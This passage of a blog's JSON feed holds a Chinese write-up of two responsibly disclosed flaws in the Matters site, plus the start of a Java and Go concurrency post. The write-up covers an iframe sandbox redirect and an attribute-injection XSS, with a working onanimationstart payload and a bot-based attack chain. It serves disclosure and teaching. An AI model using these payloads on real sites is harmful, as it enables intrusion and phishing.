punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          onerror=\"this.srcset='</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">'\"<br>        /><br>        &lt;source<br>          media=\"(min-width: 768px)\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'1080w'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          onerror=\"this.srcset='</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">'\"<br>        /><br>        &lt;source<br>          type=\"image/webp\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'540w'</span><span class=\"token punctuation\">,</span> ext<span class=\"token operator\">:</span> <span class=\"token string\">'webp'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>        /><br>        &lt;img<br>          src=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'540w'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          loading=\"lazy\"<br>        /><br>      &lt;/picture><br>    </span><span class=\"token template-punctuation string\">`</span></span><br>      <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這邊採用 RegExp 把 img src 拿出來，然後用字串拼接的方式直接拼成 HTML，再往下看 <a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/url.ts#L49\">toSizedImageURL</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">toSizedImageURL</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token punctuation\">{</span> url<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> ext <span class=\"token punctuation\">}</span><span class=\"token operator\">:</span> ToSizedImageURLProps</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> assetDomain <span class=\"token operator\">=</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NEXT_PUBLIC_ASSET_DOMAIN</span><br>    <span class=\"token operator\">?</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">https://</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NEXT_PUBLIC_ASSET_DOMAIN</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><br>    <span class=\"token operator\">:</span> <span class=\"token string\">''</span><br>  <span class=\"token keyword\">const</span> isOutsideLink <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>assetDomain<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><br>  <span class=\"token keyword\">const</span> isGIF <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">gif</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">i</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><br><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>assetDomain <span class=\"token operator\">||</span> isOutsideLink <span class=\"token operator\">||</span> isGIF<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> url<br>  <span class=\"token punctuation\">}</span><br><br>  <span class=\"token keyword\">const</span> key <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>assetDomain<span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> extedUrl <span class=\"token operator\">=</span> <span class=\"token function\">changeExt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> key<span class=\"token punctuation\">,</span> ext <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> prefix <span class=\"token operator\">=</span> size <span class=\"token operator\">?</span> <span class=\"token string\">'/'</span> <span class=\"token operator\">+</span> <span class=\"token constant\">PROCESSED_PREFIX</span> <span class=\"token operator\">+</span> <span class=\"token string\">'/'</span> <span class=\"token operator\">+</span> size <span class=\"token operator\">:</span> <span class=\"token string\">''</span><br><br>  <span class=\"token keyword\">return</span> assetDomain <span class=\"token operator\">+</span> prefix <span class=\"token operator\">+</span> extedUrl<br><span class=\"token punctuation\">}</span></code></pre>\n<p>只要 domain 是 assets 的 domain 並符合其他條件，就會經過一些字串處理之後回傳。</p>\n<p>看到這邊，就大致上了解整個文章的 render 過程了。</p>\n<p>會在 server side 用 js-xss 這套 library 進行過濾，在 client side 這邊則是用 dangerouslySetInnerHTML 來 render，其中會先對 img tag 做一些處理，把 img 改成用 picture + source 的方式針對不同解析度或是螢幕尺寸載入不同的圖片。</p>\n<p>以上就是這個網站 render 文章的整個過程，再繼續往下看之前你可以想一下，有沒有什麼地方有問題？</p>\n<p>== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE\">#</a> 第一個問題：錯誤的屬性過濾</h2>\n<p>你有發現這邊的過濾有問題嗎？</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>開放 iframe 應該是因為要讓使用者可以嵌入 YouTube 影片之類的東西，但問題是這個網站並沒有用 CSP 指定合法的 domain，因此這邊的 src 可以隨意亂填，我可以自己做一個網站然後用 iframe 嵌入。如果網頁內容設計得好，看起來就會是這個網站本身的一部分：</p>\n<p><img src=\"https://i.imgur.com/rivVdiC.png\" alt=\"\"></p>\n<p>以上只是隨便填的一個範例，主要是讓大家看個感覺，如果真的有心想攻擊的話可以弄得更精緻，內容更吸引人。</p>\n<p>如果只是這樣的話，攻擊能否成功取決與內容是否能夠取信於使用者。但其實可以做到的不只這樣，大家知道在 iframe 裡面是可以操控外面的網站嗎？</p>\n<p>cross origin 的 window 之間能存取的東西有限，唯一能夠改變的是 <code>location</code> 這個東西，意思就是我們可以在 iframe 裡面，把嵌入你的網站重新導向：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>  top<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> <span class=\"token string\">'https://google.com'</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>這樣做的話，我就可以把整個網站重新導向到任何地方，一個最簡單能想到的應用就是重新導向到釣魚網站。這樣的釣魚網站成功機率是比較高的，因為使用者可能根本沒有意識到他被重新導向到其他網站了。</p>\n<p>其實瀏覽器針對這樣的重新導向是有防禦的，上面的程式碼會出現錯誤：</p>\n<blockquote>\n<p>Unsafe attempt to initiate navigation for frame with origin '<a href=\"https://matters.news\">https://matters.news</a>' from frame with URL '<a href=\"https://53469602917d.ngrok.io/\">https://53469602917d.ngrok.io/</a>'. The frame attempting navigation is targeting its top-level window, but is neither same-origin with its target nor has it received a user gesture. See <a href=\"https://www.chromestatus.com/features/5851021045661696\">https://www.chromestatus.com/features/5851021045661696</a>.</p>\n</blockquote>\n<blockquote>\n<p>Uncaught DOMException: Failed to set the 'href' property on 'Location': The current window does not have permission to navigate the target frame to '<a href=\"https://google.com\">https://google.com</a>'</p>\n</blockquote>\n<p>因為不是 same origin，所以會阻止 iframe 對 top level window 做導向。</p>\n<p>但是呢！這個東西是可以繞過的，會運用到 sandbox 這個屬性。這個屬性其實就是在指定嵌入的 iframe 有什麼權限，所以只要改成：<code>&lt;iframe sandbox=&quot;allow-top-navigation allow-scripts allow-same-origin&quot; src=example.com&gt;&lt;/iframe&gt;</code>，就可以成功對 top level window 重新導向，把整個網站給導走。</p>\n<p>這個漏洞在 <a href=\"https://ruvlol.medium.com/1000-for-open-redirect-via-unknown-technique-675f5815e38a\">GitLab</a> 與 <a href=\"https://github.com/hackmdio/codimd/issues/1263\">codimd</a> 都有出現過。</p>\n<p>這邊的修正方式有幾個，第一個是可以先把 sandbox 這個屬性拿掉，讓這個屬性不能被使用。如果真的有地方需要用到的話，就需要檢查裡面的值，把比較危險的 <code>allow-top-navigation</code> 給拿掉。</p>\n<p>再來的話也可以限制 iframe src 的位置，可以在不同層面做掉，例如說在程式碼裡面自己過濾 src，只允許特定 domain，或者是用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src\">CSP:frame-src</a> 讓瀏覽器把這些不符合的 domain 自己擋掉。</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html\">#</a> 第二個問題：未過濾的 HTML</h2>\n<p>第一個問題能造成最大的危險大概就是重新導向了（codimd 那一篇是說在 Safari 可以做出 XSS 啦，只是我做不出來 QQ），但是除了這個之外，還有一個更大的問題，那就是這邊：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><br>  <span class=\"token operator\">&lt;</span>div<br>    className<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token function\">classNames</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <span class=\"token string\">'u-content'</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> translating <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><br>    dangerouslySetInnerHTML<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><br>      __html<span class=\"token operator\">:</span> <span class=\"token function\">optimizeEmbed</span><span class=\"token punctuation\">(</span>translation <span class=\"token operator\">||</span> article<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><br>    onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>captureClicks<span class=\"token punctuation\">}</span><br>    ref<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>contentContainer<span class=\"token punctuation\">}</span><br>  <span class=\"token operator\">/</span><span class=\"token operator\">></span><br><br>  <span class=\"token operator\">&lt;</span>style jsx<span class=\"token operator\">></span><span class=\"token punctuation\">{</span>styles<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span><br><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token operator\">></span></code></pre>\n<p><code>article.content</code> 是經過 js-xss 過濾後的 HTML 字串，所以是安全的，但這邊經過了一個 <code>optimizeEmbed</code> 去做自訂的轉換，在過濾以後還去改變內容其實是一件比較危險的事，因為如果處理的過程有疏忽，就會造成 XSS 的漏洞。</p>\n<p>在轉換裡面有一段程式碼為：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span><br>  <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image/webp<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">media</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(min-width: 768px)<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">srcSet</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>${toSizedImageURL({</span> <span class=\"token attr-name\"><span class=\"token namespace\">url:</span></span> <span class=\"token attr-name\">src,</span> <span class=\"token attr-name\"><span class=\"token namespace\">size:</span></span> <span class=\"token attr-name\">'1080w',</span> <span class=\"token attr-name\"><span class=\"token namespace\">ext:</span></span> <span class=\"token attr-name\">'webp'</span> <span class=\"token attr-name\">})}</span><br>  <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>srcset<span class=\"token operator\">=</span><span class=\"token string\">'${src}'</span></span><span class=\"token punctuation\">\"</span></span></span><br><span class=\"token punctuation\">/></span></span></code></pre>\n<p>仔細看這段程式碼，如果 <code>${toSizedImageURL({ url: src, size: '1080w', ext: 'webp' })}</code> 或是 <code>src</code> 我們可以控制的話，就有機會能夠改變屬性的內容，或者是新增屬性上去。</p>\n<p>我原本想插入一個惡意的 src 讓 onerror 變成 <code>onerror=&quot;this.srcset='test';alert(1)&quot;</code> 之類的程式碼，但我後來發現 picture 底下的 source 的 onerror 事件好像是無效的，就算 srcset 有錯也不會觸發，所以是沒用的。</p>\n<p>因此我就把焦點轉向 srcSet 以及插入新的屬性，這邊可以用 <code>onanimationstart</code> 這個屬性，在 animation 開始時會觸發的一個事件，而 animation 的名字可以去 CSS 裡面找，很幸運地找到了一個 keyframe 叫做<code>spinning</code>。</p>\n<p>因此如果 img src 為：<code>https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337)</code></p>\n<p>結合後的程式碼就是：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span><br>  <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image/webp<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">media</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(min-width: 768px)<span class=\"token punctuation\">\"</span></span>   <br>  <span class=\"token attr-name\">srcSet</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>https://assets.matters.news/processed/1080w/embed/test</span> <br>  <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token value css language-css\"><span class=\"token property\">animation-name</span><span class=\"token punctuation\">:</span>spinning</span></span></span> <br>  <span class=\"token attr-name\">onanimationstart</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>console.log(1337)</span><br>  <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>srcset<span class=\"token operator\">=</span><span class=\"token string\">'${src}'</span></span><span class=\"token punctuation\">\"</span></span></span><br><span class=\"token punctuation\">/></span></span></code></pre>\n<p>如此一來，就製造了一個 XSS 的漏洞：</p>\n<p><img src=\"https://i.imgur.com/nyugLUH.png\" alt=\"\"><br>\n<img src=\"https://i.imgur.com/iYLI0ku.png\" alt=\"\"></p>\n<p>修補方式也有幾個：</p>\n<ol>\n<li>新增 CSP header 阻止 inline script 的執行（這比較難做到，因為可能會跟現有東西牴觸，需要較多時間處理）</li>\n<li>過濾傳進來的 img url（如果過濾不好一樣有風險）</li>\n<li>先改變 HTML，才去呼叫 js-xss 幫你濾掉不該存在的屬性</li>\n</ol>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>我們找到了兩個漏洞：</p>\n<ol>\n<li>透過 <code>&lt;iframe&gt;</code> 把使用者導到任意位置</li>\n<li>透過 <code>&lt;source&gt;</code> 執行文章頁面的 XSS 攻擊</li>\n</ol>\n<p>那實際上到底可以做到什麼樣的攻擊呢？</p>\n<p>可以先用第二個漏洞發表一篇有 XSS 攻擊的文章，再寫一個機器人去所有文章底下留言，利用 <code>&lt;iframe&gt;</code> 把使用者導到具有 XSS 的文章。如此一來，只要使用者點擊任何一篇文章都會被攻擊到。</p>\n<p>不過網站本身其他地方的防禦做得不錯，儘管有 XSS 但 Cookie 是 HttpOnly 的所以偷不走，修改密碼是用寄信的所以也沒辦法修改密碼，似乎沒辦法做到真的太嚴重的事情。</p>\n<p>許多過濾 XSS 的 library 本身是安全的（雖然有些時候其實還是會被發現<a href=\"https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss\">漏洞</a>），但使用 library 的人可能忽略了一些設定或者是額外做了一些事情，導致最後產生出來的 HTML 依然是不安全的。</p>\n<p>在處理與使用者輸入相關的地方時，應該對於每一個環節都重新檢視一遍，看看是否有疏忽的地方。</p>\n<p>CSP 的 header 也建議設定一下，至少在真的被 XSS 時還有最後一道防線擋住。雖然說 CSP 有些規則也可以被繞過，但至少比什麼都沒有好。</p>\n<p>Matters 有自己的 <a href=\"https://github.com/thematters/developer-resource/blob/master/SECURITY.md\">Bug Bounty Program</a>，只要找到能證明危害的漏洞都有獎金可以拿，這篇找到的 XSS 漏洞被歸類在 High，價值 150 元美金。他們團隊相信開源能惠及技術人員，也能讓網站更安全，因此希望大家知道這個計畫的存在。</p>\n<p>最後，感謝 Matters 團隊快速的回覆以及處理，也感謝 Cymetrics 的同事們。</p>\n<p>時間軸：</p>\n<ul>\n<li>2021–05–07 回報漏洞</li>\n<li>2021–05–12 收到 Matters 團隊確認信，正在修補漏洞</li>\n<li>2021–05–12 詢問修補完是否能發表文章，獲得許可</li>\n<li>2021–05–13 修復完成</li>\n</ul>\n",
      "date_published": "2021-05-15T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-zh/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-zh/",
      "title": "比較 Java 和 Golang 在撰寫併發時處理共享變數的差異",
      "content_html": "<!-- summary -->\n<p>在寫 concurrency 程式時，通常會用 lock、synchronized 等機制保護存取共享資源的程式片段，確保一次只有一個 thread 可以使用這些共享資源。</p>\n<p>但若是共享資源不是一個程式片段而僅僅只是一個變數，使用 lock、synchronized 等機制就會顯得太笨重，甚至拖慢效能。</p>\n<!-- summary -->\n<p>以下面的 Golang 程式來說：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkLocke</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><br>\t\t<span class=\"token keyword\">var</span> l sync<span class=\"token punctuation\">.</span>Mutex<br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t\ta<span class=\"token operator\">++</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>profiling 這段程式以後會發現 CPU 時間幾乎都花在 Lock 上面，下為 profiling 結果：</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/lock-profiling.png\" alt=\"\"></p>\n<p>為了提升效能，保護單一變數在多個 thread 共用會用 lock-free 等手法。  而在撰寫 concurrency code 處理共享變數問題時，有三件事要注意：原子性 (atomicity)、可見性 (visibility) 以及有序性 (ordering)。</p>\n<p>本文就這三個議題，分別探討 Java 和 Golang 提供那些機制來處理，在此之前，我們先介紹一下這三個議題：</p>\n<h3 id=\"%E5%8E%9F%E5%AD%90%E6%80%A7\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E5%AD%90%E6%80%A7\">#</a> 原子性</h3>\n<p>共用變數的操作需確保不會被中斷。一行程式碼可能由多個 cpu 指令組成，例如說 i++，就是由<strong>從變數取值</strong>，<strong>值加一</strong>，<strong>賦值回變數</strong>三個 cpu 指令。若是兩個 thread 同時執行 i++ 時，cpu 指令執行順序可能是這樣交錯執行：</p>\n<pre><code>thread1 讀值 100  \nthread2 讀值 100  \nthread1 加一 101  \nthread2 加一 101  \nthread1 賦值 101  \nthread2 賦值 101\n</code></pre>\n<p>因此會得到一個錯誤的結果，i=101。</p>\n<p>一個簡單的 java 範例如下</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Atomic</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                counter<span class=\"token punctuation\">.</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>第 16 行預期應該顯示 100000，但實際執行往往少於 100000。這就是因為共享變數的存取沒有保持一致性導致的。</p>\n<h3 id=\"%E5%8F%AF%E8%A6%8B%E6%80%A7\"><a class=\"direct-link\" href=\"#%E5%8F%AF%E8%A6%8B%E6%80%A7\">#</a> 可見性</h3>\n<p>在多核環境，每個 CPU 都會有專屬自己的 cache，原本的用意是用來減少直接跟 memory 溝通的次數以提升效能。下圖即為一個簡單的 cpu架構示意圖。</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/cpu-architecture.png\" alt=\"\"></p>\n<p>這此架構下，同一個變數可能存在多個 cpu 快取中，若是 cpu1 更新了變數而 cpu2 毫無所知的話，cpu2 